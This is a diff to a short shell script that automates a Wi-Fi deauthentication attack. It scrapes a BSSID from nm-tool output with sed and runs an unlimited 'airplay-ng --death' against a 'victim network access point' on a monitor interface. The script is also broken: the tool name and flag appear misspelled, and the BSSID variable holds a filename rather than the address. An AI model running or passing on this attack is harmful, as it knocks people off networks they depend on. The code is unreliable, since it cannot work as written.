@@ -20,4 +20,13 @@
 # :version: 0.9.0
 ##############################################################################
 
-airplay-ng --death 0 -a [BSSID of victim network access point] mon0
+nm-tool | grep \* > output1.txt
+
+sed -e '1d' output1.txt > output2.txt
+sed 's/............................//' output2.txt > output3.txt
+sed -r 's/.{42}$//' output3.txt > BSSID.txt
+rm output1.txt output2.txt output3.txt
+
+BSSID="BSSID.txt"
+
+airplay-ng --death 0 -a [$BSSID] mon0
